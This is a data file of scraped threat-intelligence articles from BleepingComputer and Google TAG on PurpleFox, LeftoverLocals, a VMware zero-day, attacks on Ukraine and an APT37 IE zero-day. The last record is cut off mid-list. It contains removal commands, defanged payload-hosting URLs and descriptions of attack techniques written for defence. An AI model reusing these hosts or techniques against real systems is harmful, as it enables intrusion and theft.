{"id":33,"title":"PurpleFox malware infects thousands of computers in Ukraine","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/purplefox-malware-infects-thousands-of-computers-in-ukraine/","clean_text":"The Computer Emergency Response Team in Ukraine (CERT-UA) is warning about a PurpleFox malware campaign that has infected at least 2,000 computers in the country.\nThe exact impact of this widespread infection and whether it has affected state organizations or regular people's computers hasn't been determined, but the agency has shared detailed information on how to locate infections and remove the malware.\nPurpleFox (or 'DirtyMoe') is a modular Windows botnet malware first spotted in 2018 that comes with a rootkit module allowing it to hide and persist between device reboots.\nIt can be used as a downloader that introduces more potent second-stage payloads on compromised systems, offers its operators backdoor capabilities, and can also act as a distributed denial of service (DDoS) bot.\nIn October 2021, researchers noticed that new versions of PurpleFox switched to using WebSocket for command and control (C2) communications for stealth.\nIn January 2022, a campaign spread the malware under the guise of a Telegram desktop app.\nUkrainian infection wave CERT-UA used IoCs shared by Avast and TrendMicro to identify PurpleFox malware infections on Ukrainian computers, tracking the activity under the identifier 'UAC-0027.' \"\nIn the process of a detailed study of the cyber threat, research was conducted on the samples of malicious software received, the characteristics of the operating infrastructure of the control servers were identified, and more than 2000 infected computers in the Ukrainian segment of the internet were discovered,\" explains CERT-UA in a machine-translated security warning.\nCERT-UA says PurpleFox typically infects systems when victims launch laced MSI installers and highlights its self-propagation capabilities using exploits for known flaws and password brute-forcing.\nThe agency recommends isolating systems that run outdated OS versions and software using VLAN or physical network segmentation with incoming/outgoing filtering to prevent spreading.\nCERT-UA monitored infected hosts between January 20 and 31, 2024, detecting 486 intermediate control server IP addresses, most of which are located in China.\nCERT-UA notes that PurpleFox's removal is challenging due to its use of a rootkit, but there are still effective methods that can help detect and uproot the malware.\nFirst, to discover PurpleFox infections, users are recommended to do the following: - Examine network connections to \"high\" (10000+) ports using the IP address list in the report's appendix. -\nUse regedit.exe to check for the following registry values: - WindowsXP: HKEY_LOCAL_MACHINE\\ControlSet001\\Services\\AC0[0-9] - Windows7: HKEY_LOCAL_MACHINE\\Software\\Microsoft\\DirectPlay8\\Direct3D - Analyze \"Application\" log in Event Viewer for event IDs 1040 and 1042, source: \"MsiInstaller\" - Check \"C:\\Program Files\" for folders with random names, e.g., \"C:\\Program Files\\dvhvA\" - Verify the persistent execution of the malware, which uses services and stores files in specific directories, impeded by a rootkit from detection/removal.\nKey locations are: - HKEY_LOCAL_MACHINE\\System\\ControlSet001\\services\\MsXXXXXXXXApp - C:\\Windows\\System32\\MsXXXXXXXXApp.dll - C:\\Windows\\AppPatch\\DBXXXXXXXXMK.sdb, RCXXXXXXXXMS.sdb, TKXXXXXXXXMS.sdb - (where XXXXXXXX is a random [A-F0-9]{8} sequence, e.g., \"MsBA4B6B3AApp.dll\") If any of the above indicates PurpleFox infection, CERT-UA suggests either using Avast Free AV to run a \"SMART\" scan and remote all modules or perform the following steps: - Boot from LiveUSB or connect the infected drive to another computer - Manually delete \"MsXXXXXXXXApp.dll\" and \".sdb\" modules - Boot normally and remove the service from the registry For disk operations: - Use lsblk and fdisk -lu /dev/sda to identify partitions - Mount the system partition in read-write mode: mount -orw,offset=$((512*206848)) /dev/sda /mnt/ - Search and remove files in /mnt/Windows/AppPatch and /mnt/Windows/System32 (e.g., ls -lat /mnt/Windows/AppPatch/ and rm -rf /mnt/Windows/AppPatch/RC2EE39E00MS.sdb) - Unmount with umount /mnt/ After cleaning, to avoid re-infection from PurpleFox, which is very likely if there are still infected machines on the same network, enable the firewall on Windows and create a rule to block incoming traffic from ports 135, 137, 139, and 445.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":17,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"purplefox"}}
{"id":34,"title":"AMD, Apple, Qualcomm GPUs leak AI data in LeftoverLocals attacks","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/amd-apple-qualcomm-gpus-leak-ai-data-in-leftoverlocals-attacks/","clean_text":"A new vulnerability dubbed 'LeftoverLocals' affecting graphics processing units from AMD, Apple, Qualcomm, and Imagination Technologies allows retrieving data from the local memory space.\nTracked as CVE-2023-4969, the security issue enables data recovery from vulnerable GPUs, especially in the context of large language models (LLMs) and machine learning (ML) processes.\nLeftoverLocals was discovered by Trail of Bits researchers Tyler Sorensen and Heidy Khlaaf, who reported it privately to the vendors before publishing a technical overview.\nLeftoverLocals details The security flaw stems from the fact that some GPU frameworks do not isolate memory completely and one kernel running on the machine could read values in local memory written by another kernel.\nTrail of Bits researchers Tyler Sorensen and Heidy Khlaaf, who discovered and reported the vulnerability, explain that an adversary only needs to run a GPU compute application (e.g. OpenCL, Vulkan, Metal) to read data a user left in the GPU local memory. \"\nUsing these, the attacker can read data that the victim has left in the GPU local memory simply by writing a GPU kernel that dumps uninitialized local memory\" - Trail of Bits LeftoverLocals lets attackers launch a 'listener' - a GPU kernel that reads from uninitialized local memory and can dump the data in a persistent location, such as the global memory.\nIf the local memory is not cleared, the attacker can use the listener to read values left behind by the 'writer' - a program that stores values to local memory.\nThe animation below shows how the writer and listener programs interact and how the latter can retrieve data from the former on affected GPUs.\nThe recovered data can reveal sensitive information about the victim's computations, including model inputs, outputs, weights, and intermediate computations.\nIn a multi-tenant GPU context that run LLMs, LeftoverLocals can be used to listen in on other users' interactive sessions and recover from the GPU's local memory the data from the victim's \"writer\" process.\nThe Trail of Bits researchers have created a proof of concept (PoC) to demonstrate LeftoverLocals and showed that an adversary can recover 5.5MB of data per GPU invocation, depending on the GPU framework.\nOn an AMD Radeon RX 7900 XT powering the open-source LLM llama.cpp, an attacker can get as much as 181MB per query, which is sufficient to reconstruct the LLM's responses with high accuracy.\nImpact and remediation Trail of Bits researchers discovered CVE-2023-4969 in September 2023 and informed CERT/CC to help coordinate the disclosure and patching efforts.\nMitigation efforts are underway as some vendors already fixed it while others are still working on a way to develop and implement a defense mechanism.\nIn the case of Apple, the latest iPhone 15 is unaffected and fixes became available for A17 and M3 processors but the issue persist on M2-powered computers.\nAMD informed that the following GPU models remain vulnerable as its engineers investigate effective mitigation strategies.\nQualcomm has released a patch via firmware v2.0.7 that fixes LeftoverLocals in some chips but others remain vulnerable.\nImagination released a fix in DDK v23.3 in December 2023.\nHowever, Google warned in January 2024 that some of the vendor's GPUs are still impacted.\nIntel, NVIDIA, and ARM GPUs have reported that the data leak problem doesn't impact their devices.\nTrail of Bits suggests that GPU vendors implement an automatic local memory clearing mechanism between kernel calls, ensuring isolation of sensitive data written by one process.\nWhile this approach might introduce some performance overhead, the researchers suggest that the trade-off is justified given the severity of the security implications.\nOther potential mitigations include avoiding multi-tenant GPU environments in security-critical scenarios and implementing user-level mitigations.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":25,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"qualcomm"}}
{"id":35,"title":"Chinese hackers exploit VMware bug as zero-day for two years","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/chinese-hackers-exploit-vmware-bug-as-zero-day-for-two-years/","clean_text":"A Chinese hacking group has been exploiting a critical vCenter Server vulnerability (CVE-2023-34048) as a zero-day since at least late 2021.\nThe flaw was patched in October, with VMware confirming this Wednesday that it's aware of CVE-2023-34048 in-the-wild exploitation, although it didn't share any other details on the attacks.\nHowever, as security firm Mandiant revealed today, the vulnerability was used by the UNC3886 Chinese cyber espionage group as part of a previously reported campaign, exposed in June 2023.\nThe cyberspies used it to breach their targets' vCenter servers and compromised credentials to deploy VirtualPita and VirtualPie backdoors on ESXi hosts via maliciously crafted vSphere Installation Bundles (VIBs).\nIn the next stage, they exploited the CVE-2023-20867 VMware Tools authentication bypass flaw to escalate privileges, harvest files, and exfiltrate them from guest VMs.\nWhile, until now, Mandiant didn't know how the attackers gained privileged access to victims' vCenter servers, the link was made evident in late 2023 by a VMware vmdird service crash minutes before the backdoors' deployment closely matching CVE-2023-34048 exploitation. \"\nWhile publicly reported and patched in October 2023, Mandiant has observed these crashes across multiple UNC3886 cases between late 2021 and early 2022, leaving a window of roughly a year and a half that this attacker had access to this vulnerability,\" Mandiant said on Friday. \"\nMost environments where these crashes were observed had log entries preserved, but the 'vmdird' core dumps themselves were removed. \"\nVMware's default configurations keep core dumps for an indefinite amount of time on the system, suggesting the core dumps were purposely removed by the attacker in an attempt to cover their tracks.\"\nUNC3886 is known for focusing on organizations in the defense, government, telecom, and technology sectors in the United States and the APJ region.\nThe Chinese cyberspies' favorite targets are zero-day security flaws in firewall and virtualization platforms that don't have Endpoint Detection and Response (EDR) capabilities that would make it easier to detect and block their attacks.\nIn March, Mandiant revealed they also abused a Fortinet zero-day (CVE-2022-41328) in the same campaign to compromise FortiGate firewall devices and install previously unknown Castletap and Thincrust backdoors. \"\nThe attack is highly targeted, with some hints of preferred governmental or government-related targets,\" Fortinet said at the time. \"\nThe exploit requires a deep understanding of FortiOS and the underlying hardware.\nCustom implants show that the actor has advanced capabilities, including reverse-engineering various parts of FortiOS.\"\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":17,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"vmware"}}
{"id":36,"title":"Ukraine remains Russia’s biggest cyber focus in 2023","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/ukraine-remains-russias-biggest-cyber-focus-in-2023/","clean_text":"Ukraine remains Russia’s biggest cyber focus in 2023 Google’s Threat Analysis Group (TAG) continues to disrupt campaigns from multiple sets of Russian government-backed attackers focused on the war in Ukraine.\nThis blog provides insights on attacker trends from primarily January - March 2023, continuing our analysis from Fog of War: How the Ukraine Conflict Transformed the Cyber Threat Landscape.\nIn the first quarter of 2023, Russian government-backed phishing campaigns targeted users in Ukraine the most, with the country accounting for over 60% of observed Russian targeting.\nLooking at information operations (IO), our takedowns reflect a steady pattern of Russian attempts to circumvent our policies, details of which are reported in our quarterly TAG Bulletin.\nHere is a deeper look at notable campaigns TAG has observed since our last update: FROZENBARENTS targets energy sector, continues hack and leak operations FROZENBARENTS (aka Sandworm), a group attributed to Russian Armed Forces’ Main Directorate of the General Staff (GRU) Unit 74455, continues to focus heavily on the war in Ukraine with campaigns spanning intelligence collection, IO, and leaking hacked data through Telegram.\nAs we described in the Fog of War report, FROZENBARENTS remains the most versatile GRU cyber actor with offensive capabilities including credential phishing, mobile activity, malware, external exploitation of services, and beyond.\nThey target sectors of interest for Russian intelligence collection including government, defense, energy, transportation/logistics, education and humanitarian organizations.\nFROZENBARENTS continues to exploit EXIM mail servers globally and use these compromised hosts as part of their operational network, a trend going back to at least August 2019.\nThese compromised hosts have been observed accessing victim networks, interacting with victim accounts, sending malicious emails and engaged in information operations (IO) activity.\nEnergy sector targeting The Caspian Pipeline Consortium (CPC) controls one of the world's largest oil pipelines that transports oil from Kazakhstan to the Black Sea.\nSince November 2022, FROZENBARENTS has engaged in a sustained effort to target organizations associated with the CPC and other energy sector organizations in Europe.\nThe first campaign targeted CPC employees, specifically the Moscow office, with phishing links delivered via SMS.\nPhishing site spoofing CPC, an energy sector organization Throughout Q1 2023, FROZENBARENTS conducted multiple campaigns against energy sector organizations in Eastern Europe, delivering links to fake Windows update packages hosted on a domain spoofing CPC.\nIf executed, the fake update would run a variant of the Rhadamanthys stealer to exfiltrate stored credentials, including browser cookies.\nDefense targeting Beginning in early December 2022, FROZENBARENTS launched multiple waves of credential phishing campaigns targeting the Ukrainian defense industry, military and Ukr.net webmail users.\nThese phishing emails spoofed security and other system administrator type notifications and in some cases were sent through third-party email campaign management services.\nPhishing site spoofing Ukroboronprom, a Ukrainian defense company IO, hack and leak campaigns Active in the IO space, FROZENBARENTS actors create online personas to create and disseminate news content as well as leak stolen data.\nThese actors promote narratives that are pro-Russia, and against Ukraine, NATO and the West.\nOne persona, which TAG assesses is created and controlled by FROZENBARENTS actors, is 'CyberArmyofRussia' or 'CyberArmyofRussia_Reborn', which has a presence on Telegram, Instagram and YouTube.\nBoth the YouTube channel, terminated upon identification, and Instagram account received minimal engagement with a negligible number of subscribers or followers.\nCyberArmyofRussia YouTube channel Instagram posts from CARR CyberArmyofRussia_Reborn Telegram channel The CyberArmyofRussia_Reborn Telegram channel has primarily been used for posting stolen data and DDoS targets.\nIn several recent incidents, FROZENBARENTS compromised a webserver of the target organization and uploaded a webshell to maintain persistent access to the compromised system.\nThe attackers then deployed Adminer, a single file PHP script for managing databases, to exfiltrate data of interest.\nShortly after exfiltration, the data appeared on the CyberArmyofRussia_Reborn Telegram channel.\nTelegram phishing FROZENBARENTS has targeted users associated with popular channels on Telegram, a social media platform popular in both Ukraine and Russia.\nPhishing campaigns delivered via email and SMS spoofed Telegram to steal credentials, sometimes targeting users following pro-Russia channels.\nPhishing site spoofing Telegram An interesting artifact of the Telegram phishing campaigns is a ‘val’ URL parameter in the phishing links with a base64 encoded value, providing insight into the operators’ mindset and their condescending attitude towards Ukraine and the Cyber Police of Ukraine.\nBase64 encoded values found in phishing link URL parameter GRU @bio_genie IO Campaign on Telegram, Substack Since April 2022, actors attributed to the GRU have maintained a Telegram channel to promote and amplify narratives related to the use of biological weapons in Ukraine and how the United States is responsible for the proliferation of biological weapons around the world.\nThe Telegram channel publishes Russian-language content, and is likely aimed at Russian speaking audiences.\nIn December 2022, they also created a similarly named Substack, published in English.\nWhile the Telegram channel receives regular updates, sometimes multiple times per day, the Substack has only received a single post.\nThe actors controlling this channel have conducted email campaigns soliciting input from prominent Russian and Belarussian researchers and medical professionals involved in epidemiology and microbiology.\nAdditionally, they have attempted to engage with journalists globally in an attempt to drive traffic to the Telegram channel and further amplify their narratives.\nWhile this activity has been conducted from infrastructure similar to known FROZENBARENTS infrastructure, TAG is currently unable to confidently assess if this activity has been conducted by FROZENBARENTS, or if this campaign is being conducted by a different GRU unit.\n@bio_genie Telegram channel @bio_genie substack FROZENLAKE uses XSS in phishing against Ukranian users In early 2023, another Russian GRU actor TAG tracks as FROZENLAKE (aka APT28) was especially focused on Ukraine.\nIn February and March, they sent multiple large waves of phishing emails to hundreds of users in Ukraine, continuing the group’s 2022 focus on targeting webmail users in Eastern Europe.\nStarting in early February 2023 we saw FROZENLAKE using reflected cross-site scripting (XSS) on multiple Ukrainian government websites to redirect users to phishing pages - a new TTP for the group.\nRecent examples of these reflected XSS are included below.\nRecent examples of reflected XSS ukr.net phishing page The majority of observed phishing domains were created on free services and used for a short time, often a single campaign.\nWhen a user submitted their credentials on the phishing sites, they were sent via HTTP POST request to a remote IP address, which TAG analysis identified as compromised Ubiquiti network devices.\nPUSHCHA continues targeting regional webmail providers PUSHCHA, a Belarusian threat actor, has consistently targeted users in Ukraine and neighboring countries throughout the war.\nTheir campaigns typically target regional webmail providers such as i.ua, meta.ua and similar services.\nThe phishing campaigns are targeted, focused on small numbers of users in Ukraine.\nPUSHCHA i.ua phishing page PUSHCHA meta.ua phishing page Russian Information Operations Moscow continues to leverage the full spectrum of information operations — from overt state-backed media to covert platforms and accounts — to shape public perception of the war in Ukraine.\nIn the first quarter of 2023, TAG observed a coordinated IO campaign from actors affiliated with the Internet Research Agency (IRA) creating content on Google products such as YouTube, including commenting and upvoting each other’s videos.\nThe group has focused particularly on narratives supportive of Russia and the business interests of Russian oligarch Yevgeny Prigozhin, especially the Wagner Group.\nAs noted in the Fog of War report, TAG has continued to see IRA-linked actors create YouTube Shorts.\nThe Shorts are crafted for a Russian domestic audience, and are often \"news\"-like narratives on the Ukraine war.\nThe group was also promoting a new film by Aurum LLC, a film company partially owned by Prigozhin.\nThis movie has a high production value and communicates narratives portraying the Wagner Group in a positive light.\nTAG also observed IRA-linked accounts publish coordinated narratives on Blogger.\nThe narratives published by the group continue to focus on regional domestic Russian affairs.\nPromotion for movie film about the Wagner Group Screenshot from a YouTube short supporting the Wagner Group Screenshot from a YouTube short with pro-Russian and anti-Ukrainian content Financially motivated actors CERT-UA previously reported on campaigns using RomCom malware to target government and military officials in Ukraine by the group behind Cuba ransomware (despite the name, US CISA reports no indication these actors are affiliated with the Republic of Cuba).\nThis represents a large shift from this actor's traditional ransomware operations, behaving more similarly to an actor conducting operations for intelligence collection.\nTAG also observed campaigns from this actor targeting attendees of the Munich Security Conference and the Masters of Digital conference.\nThe attackers are using phishing URLs with spoofed domain names related to ChatGPT and OpenAI.\nThe campaigns have been relatively small in volume, sent from spoofed domains, and targeting users' Gmail accounts.\nProtecting our users Upon discovery, all identified websites and domains were added to Safe Browsing to protect users from further exploitation.\nWe also send affected targeted Gmail and Workspace users government-backed attacker alerts notifying them of the activity.\nWe encourage anyone who might be a potential target to enable Google Account Level Enhanced Safe Browsing and ensure that all devices are updated.\nWe remain committed to identifying bad actors, disrupting their campaigns, and sharing relevant information with others across industry and governments to raise awareness, protect users and prevent future attacks.\nIOCs FROZENBARENTS: - cpcpipe[.]com - cpcpipe[.]org - 104.156.149[.]126 - c80656fe59bdeb3e701d1f7eeaaba2ef673368b2c4947945f598e3e84a6cb7f8 - telegram.org.security.ohsxy[.]com - telegram.org.4234e8234ad0f.24o1[.]com - ukroboronprom.com.ukr[.]pm - 181.119.30[.]71 - 45.76.31[.]101 - 45.56.93[.]83 - 45.124.86[.]84 bio_genie IO campaign: - https://t.me/s/bio_genie - https://biogenie.substack.com FROZENLAKE: - setnewcreds.ukr.net[.]frge[.]io - ukrprivatesite.frge[.]io - robot-876.frge[.]io - 85.240.182[.]23 - 68.76.150[.]97 PUSHCHA: - passport-ua[.]site - passport-log[.]online - meta-l[.]space - support@passport-ua[.]online Cuba Ransomware / RomCom: - openai@chatgpt4beta[.]com - chatgpt4beta[.]com - mod2023@masterofdigital[.]org - masterofdigital[.]org - 4f0b12caa97e52f3d2edada9133f2e4a3442953d14c8ed12deb7219c722ea197","num_sentences":62,"metadata":{"source":"blog","platform":"Google_TAG","filename":"FROZENBARENTS"}}
{"id":37,"title":"Initial access broker repurposing techniques in targeted attacks against Ukraine","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/initial-access-broker-repurposing-techniques-in-targeted-attacks-against-ukraine/","clean_text":"Initial access broker repurposing techniques in targeted attacks against Ukraine As the war in Ukraine continues, TAG is tracking an increasing number of financially motivated threat actors targeting Ukraine whose activities seem closely aligned with Russian government-backed attackers.\nThis post provides details on five different campaigns conducted from April to August 2022 by a threat actor whose activities overlap with a group CERT-UA tracks as UAC-0098 [1, 2, 3].\nBased on multiple indicators, TAG assesses some members of UAC-0098 are former members of the Conti cybercrime group repurposing their techniques to target Ukraine.\nUAC-0098 is a threat actor that historically delivered the IcedID banking trojan, leading to human-operated ransomware attacks.\nThe attacker has recently shifted their focus to targeting Ukrainian organizations, the Ukrainian government, and European humanitarian and non-profit organizations.\nTAG assesses UAC-0098 acted as an initial access broker for various ransomware groups including Quantum and Conti, a Russian cybercrime gang known as FIN12 / WIZARD SPIDER.\nTAG is sharing additional context and indicators, including disclosing new campaigns that weren’t previously detailed or attributed to the group, to assist the security community in efforts to investigate and defend against this threat.\nInitial Encounter TAG started actively tracking UAC-0098 after identifying an email phishing campaign delivering AnchorMail (referred to as “LackeyBuilder”) in late April 2022.\nAnchorMail is a version of the Anchor backdoor that uses the simple mail transfer protocol (SMTPS) for command and control (C2) communication.\nThe tool, assessed to be developed by the Conti group, previously was installed as a TrickBot module.\nTAG was able to connect the activity to earlier phishing emails targeting Ukraine with lures like: Subject: Проєкт «Активні громадяни» (Project \"Active citizen\") Subject: Файл_змінив,_бронь (File_change,_booking) URLs: https://activecitizens[.]in[.]ua/Project1[.]xls https://lviv[.]uz[.]ua/Artists[.]xls https://aprize[.]com[.]ua/Artists[.]xls The campaign stood out because it appeared to be both financially and politically motivated.\nIt also seemed experimental: instead of dropping AnchorMail directly, it used LackeyBuilder and batch scripts to build AnchorMail on the fly.\nThe UAC-0098 activity was then identified in another email campaign delivering IcedID and Cobalt Strike.\nOn April 13, at least three Excel files were sent as attachments to Ukrainian organizations: - Мобілізаційний реєстр.xls (Mobilization register.xls) 8f7e3471c1bb2b264d1b8f298e7b7648dac84ffd8fb2125f3b2566353128e127 - Мобілізаційний список.xls Mobilization list.xls 08d30d6646117cd96320447042fb3857b4f82d80a92f31ee91b16044b87929c0 - Список мобілізованих громадян.xls List of mobilized citizens.xls 1f3c5dd0a79323c57ad194a49eebaaf2f624822df401995e51a4c58b5a607a45 The group was active from mid-April to mid-June of 2022, frequently changing its tactics, techniques and procedures (TTPs), tooling and lures.\nWhile the targeting varied from campaign to campaign, the group repeatedly targeted Ukrainian hotels.\nImpersonating National Cyber Police of Ukraine On May 11 2022, UAC-0098 launched another attack targeting organizations working in the hospitality industry.\nThe phishing emails were impersonating the National Cyber Police of Ukraine and contained a download link, urging targets to download an update for their operating system.\nThe payload was hosted on https://cyberpolice.gov.uz[.]ua/article/KB5012599.msi, where gov.uz[.]ua , which is an attacker-controlled domain, registered just one day before the attack.\nDuring execution, the file runs a PowerShell script downloaded from http://blinkin[.]top/3538313546/license?serial={GENERATED_SERIAL} to fetch and execute an IcedID dll: Indicators - https://drive.google[.]com/file/d/19ZtX3k38g2OXQnFkEj3JH4EiI_vUqgnK/view?usp=drive_web - gov[.]uz[.]ua - blinkin[.]top - kirbi[.]top Expanded targeting to European NGOs using “Stolen Images Evidence” On May 17, UAC-0098 used a compromised account of a hotel in India.\nThe actor sent phishing emails with a ZIP archive attached containing a malicious XLL file.\nAs before, the targets appeared to be organizations working in the hospitality industry in Ukraine.\nWhen opened, the XLL file downloads a variant of IcedID from the following URL: http://84.32.190[.]34/KB2533623.exe.\nIn other campaigns, the same compromised email account was used to target humanitarian NGOs in Italy.\nIcedID was also delivered as an MSI file through the anonymous file sharing service dropfiles[.]me, with expiring links to the payload and a malware distribution service known as Stolen Images Evidence.\nThis service typically uses website contact forms to send fake legal or copyright violation threats with a link to storage hosting a social engineering page, delivering malware chosen by the service’s customer. “\nStolen Images Evidence” distribution service delivering UAC-0098 payload “dropfiles[.]me” file sharing website delivering UAC-0098 payload Indicators - https://dropfiles[.]me/download/af46b89ae667c0d0/ - http://storage.googleapis[.]com/cor1krp299kh13.appspot[.]com/ - http://storage.googleapis[.]com/xpd9q3z05awvw4.appspot[.]com/ - http://84.32.190[.]34/KB2533623.exe - donaldtr[.]com Impersonating StarLink and Microsoft On May 19, UAC-0098 used support@starlinkua[.]info to send phishing emails impersonating representatives of Elon Musk and StarLink, in order to deliver software required to connect to the internet using StarLink satellites.\nThe email included a link to https://box[.]starlinkua[.]info/cloud/index[.]php/s/{GENERATED_ID}, an MSI installer dropping IcedID, downloaded from the attacker-controlled domain, starlinkua[.]info.\nOn May 23, a similar attack was performed against a wider range of Ukrainian organizations operating in the technology, retail and government sectors.\nThe delivered payload was the same IcedID binary with filename KB2533623.msi to resemble a Microsoft update and was hosted on https://box[.]microsoftua[.]com/cloud/index[.]php/s/{GENERATED_ID}.\nIndicators - support@starlinkua[.]info - starlinkua[.]info - microsoftua[.]com - baiden[.]top Cobalt Strike delivered by malicious documents built by EtterSilent builder On May 24, a newly registered domain kompromatua[.]info was used to target the Academy of Ukrainian Press (AUP).\nThe phishing email contained a dropbox link pointing to a malicious document named “ABR090TAN-TS.xlsb”.\nThe Excel document was created using EtterSilent, a malicious document builder used by many cybercrime groups.\nThe malicious document directly fetched a Cobalt Strike dll from http://84.32.190[.]34/bc_https_x64.dll.\nNote, the same IP was used to deliver IcedID payloads in the second campaign on May 17.\nThe attacker used the same link and the same file to target organizations from the hospitality industry.\nIndicators - jurnalist@kompromatua[.]info - kompromatua[.]info - 84.32.190[.]34 Follina Exploitation On June 10, a few days after the CVE-2022-30190 (also known as Follina) disclosure, a weaponized exploit named clickme.rtf was uploaded to VirusTotal.\nUpon execution, the file fetched content from http://64.190.113[.]51/index[.]html.\nAt that time, no content was delivered from the URL.\nNine days later, the same server was used, this time using port 8000, to serve content in a large-scale campaign exploiting the same vulnerability.\nOn June 19, TAG disrupted a campaign with more than 10,000 spam emails impersonating the State Tax Service of Ukraine.\nThe emails had an attached ZIP file containing a malicious RTF file.\nUpon execution, the next stage was downloaded from http://64.190.113[.]51:8000/index.html.\nThis campaign was previously reported by CERT-UA and TAG’s update on cyber activity in Eastern Europe.\nPhishing email used in a campaign exploiting CVE-2022-30190, translated from Ukrainian The html file fetched Cobalt Strike, ked.dll, from 5.199.173[.]152.\nShared code in the Cobalt Strike payload and IcedID suggests they are both encrypted with the same crypting service made by Conti group.\nThis is aligned with IBM Security X-Force findings.\nIndicators - http://64.190.113[.]51:8000/index[.]html - http://5.199.173[.]152/ked[.]dll - baidenfree[.]com Conclusions UAC-0098 activities are representative examples of blurring lines between financially motivated and government backed groups in Eastern Europe, illustrating a trend of threat actors changing their targeting to align with regional geopolitical interests.\nIn the initial encounter with UAC-0098, “lackeyBuilder” was observed for the first time.\nThis is a previously undisclosed builder for AnchorMail, one of the private backdoors used by the Conti groups.\nSince then, the actor consistently used tools and services traditionally employed by cybercrime actors for the purpose of acquiring initial access: IcedID trojan, EtterSilent malicious document builder, and the “Stolen Image Evidence” social engineering malware distribution service.\nIn the activity observed following April 2022, the group’s targeting wildly varied from European NGOs to less targeted attacks on Ukrainian government entities, organizations and individuals.\nRather uniquely, the group demonstrates strong interest in breaching businesses operating in the hospitality industry of Ukraine, going as far as launching multiple distinct campaigns against the same hotel chains.\nSo far, TAG has not identified what post-exploitation actions UAC-0098 takes following a successful compromise.\nActivities described in this post are consistent with findings from IBM Security X-Force and CERT-UA.\nTAG can further confirm attribution based on multiple overlaps between UAC-0098 and Trickbot or the Conti cybercrime group.","num_sentences":55,"metadata":{"source":"blog","platform":"Google_TAG","filename":"UAC-0098"}}
{"id":38,"title":"Internet Explorer 0-day exploited by North Korean actor APT37","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/internet-explorer-0-day-exploited-by-north-korean-actor-apt37/","clean_text":"Internet Explorer 0-day exploited by North Korean actor APT37 To protect our users, Google’s Threat Analysis Group (TAG) routinely hunts for 0-day vulnerabilities exploited in-the-wild.\nThis blog will describe a 0-day vulnerability, discovered by TAG in late October 2022, embedded in malicious documents and used to target users in South Korea.\nWe attribute this activity to a group of North Korean government-backed actors known as APT37.\nThese malicious documents exploited an Internet Explorer 0-day vulnerability in the JScript engine, CVE-2022-41128.\nOur policy is to quickly report vulnerabilities to vendors, and within a few hours of discovering this 0-day, we reported it to Microsoft and patches were released to protect users from these attacks.\nThis is not the first time APT37 has used Internet Explorer 0-day exploits to target users.\nThe group has historically focused their targeting on South Korean users, North Korean defectors, policy makers, journalists and human rights activists.\nMicrosoft Office document using tragic news as a lure On October 31, 2022, multiple submitters from South Korea reported new malware to us by uploading a Microsoft Office document to VirusTotal.\nThe document, titled “221031 Seoul Yongsan Itaewon accident response situation (06:00).docx”, references the tragic incident in the neighborhood of Itaewon, in Seoul, South Korea during Halloween celebrations on October 29, 2022.\nThis incident was widely reported on, and the lure takes advantage of widespread public interest in the accident.\nThe document downloaded a rich text file (RTF) remote template, which in turn fetched remote HTML content.\nBecause Office renders this HTML content using Internet Explorer (IE), this technique has been widely used to distribute IE exploits via Office files since 2017 (e.g. CVE-2017-0199).\nDelivering IE exploits via this vector has the advantage of not requiring the target to use Internet Explorer as its default browser, nor to chain the exploit with an EPM sandbox escape.\nUpon investigation, TAG observed the attackers abused an 0-day vulnerability in the JScript engine of Internet Explorer.\nTAG identified Internet Explorer 0-day The vulnerability resides within “jscript9.dll”, the JavaScript engine of Internet Explorer, and can be exploited to execute arbitrary code when rendering an attacker-controlled website.\nThe bug itself is an incorrect JIT optimization issue leading to a type confusion and is very similar to CVE-2021-34480, which was identified by Project Zero and patched in 2021.\nTAG reported the vulnerability to Microsoft on October 31, 2022, and the label CVE-2022-41128 was assigned on November 3, 2022.\nThe vulnerability was patched on November 8, 2022.\nAnalysis of the exploit In a typical delivery scenario, the initial document would have the Mark-of-the-Web applied.\nThis means the user has to disable protected view before the remote RTF template is fetched.\nWhen delivering the remote RTF, the web server sets a unique cookie in the response, which is sent again when the remote HTML content is requested.\nThis likely detects direct HTML exploit code fetches which are not part of a real infection.\nThe exploit JavaScript also verifies that the cookie is set before launching the exploit.\nAdditionally it reports twice to the C2 server: before launching the exploit and after the exploit succeeds.\nTAG also identified other documents likely exploiting the same vulnerability and with similar targeting, which may be part of the same campaign.\nFurther details on those documents can be found in the “Indicators” section below.\nThe delivered shellcode uses a custom hashing algorithm to resolve Windows APIs.\nThe shellcode erases all traces of exploitation by clearing the Internet Explorer cache and history before downloading the next stage.\nThe next stage is downloaded using the same cookie that was set when the server delivered the remote RTF.\nAdditional technical information on the vulnerability, the exploit and the patch, is available in the Root Cause Analysis.\nConclusions TAG is committed to sharing research to raise awareness on bad actors like APT37 within the security community, and for companies and individuals that may be targeted.\nBy improving understanding of the tactics and techniques of these types of actors, we hope to strengthen protections across the ecosystem.\nWe will also continuously apply these findings to improve the safety and security of our products and continue to effectively combat threats and protect users who rely on our services.\nWe’d be remiss if we did not acknowledge the quick response and patching of this vulnerability by the Microsoft team.\nIndicators of compromise (IOCs) Initial documents: - 56ca24b57c4559f834c190d50b0fe89dd4a4040a078ca1f267d0bbc7849e9ed7 - af5fb99d3ff18bc625fb63f792ed7cd955171ab509c2f8e7c7ee44515e09cebf - 926a947ea2b59d3e9a5a6875b4de2bd071b15260370f4da5e2a60ece3517a32f - 3bff571823421c013e79cc10793f238f4252f7d7ac91f9ef41435af0a8c09a39 - 